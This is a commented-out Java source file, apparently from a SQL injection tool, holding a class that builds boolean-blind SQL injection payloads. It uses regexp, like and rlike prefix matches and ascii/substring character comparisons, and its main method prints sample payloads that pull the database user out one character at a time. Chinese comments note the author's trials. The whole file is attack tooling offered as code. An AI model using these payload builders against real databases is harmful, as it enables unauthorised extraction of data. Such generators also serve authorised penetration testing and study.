/*
package com.sqldd.payloadOrigin;

public class BooleanBlindPayloads {
    private String prefix = "'";
    private String suffix = "'";
    */
/**
     * 逻辑语句
     * ascii(subchar或者substr
     * 可以if case(条件,1,0)
     * regexp '^输入'或'输入$'   输入$为啥不行？  like  rlike同regexp
     *//*



    //两个正则的boundary
    //要求除了关键字和'，还有^或者%
    public String getBoundaryRe(String regeKey,String query,String qStr){
        if("regexp".equals(regeKey))
            return "(" + query + " " +regeKey + "'^" + qStr +"')";
        else if("like".equals(regeKey))
            return "(" + query+ " " + regeKey + "'" + qStr + "%')";
        else if("rlike".equals(regeKey))
            return "(" + query + " " +regeKey + "'^" + qStr +"')";
        return null;
    }

    //其他判断语句的boundary
    public String getBoundaryOthers(String asciiFuncMain,String asciiFuncVice,String substrFuncMain,String substrFuncVice,int charIndex,String query,String comparisonChar,String comparisonRst){
        // select 1 and ascii(substring(user(),1,1)) = (("114"));
        //这里直接用TimeBlindpayloads的方法
        TimeBlindPayloads timeblind = new TimeBlindPayloads();
        String subStrFuncChoiseStr = timeblind.subStrFuncChoise(substrFuncMain, substrFuncVice, query, charIndex);
        String asciiFuncChoiseStr = timeblind.asciiFuncChoise(asciiFuncMain, asciiFuncVice, subStrFuncChoiseStr);
        return asciiFuncChoiseStr + " " + comparisonChar + " " + comparisonRst;
    }

    public String getBooleanPayloadsOrigin(String boundaryType,String regeKey,int charIndex,String qStr,String asciiFuncMain,String asciiFuncVice,String substrFuncMain,String substrFuncVice,String query,String comparisonChar,String comparisonRst) {
        String payload = "";
        switch (boundaryType){
            case "re":{
                payload += getBoundaryRe(regeKey, query, qStr);
                break;
            }
            case "other":{
                payload += getBoundaryOthers(asciiFuncMain, asciiFuncVice, substrFuncMain, substrFuncVice, charIndex, query,comparisonChar,comparisonRst);
                break;
            }
        }
        return payload;
    }


    public static void main(String[] args) {
        BooleanBlindPayloads test = new BooleanBlindPayloads();
        String str = test.getBooleanPayloadsOrigin("re", "regexp", 1, "roo", null, null, null, null, "(select user())",null,null);
        System.out.println(str);

        String str1 = test.getBooleanPayloadsOrigin("re", "like", 2, "roo", null, null, null, null, "(select user())",null,null);
        System.out.println(str1);

        String str2 = test.getBooleanPayloadsOrigin("other", null, 1, null, "ascii", null, "substr", null, "(select user())","=","12");
        System.out.println(str2);
    }
}
*/
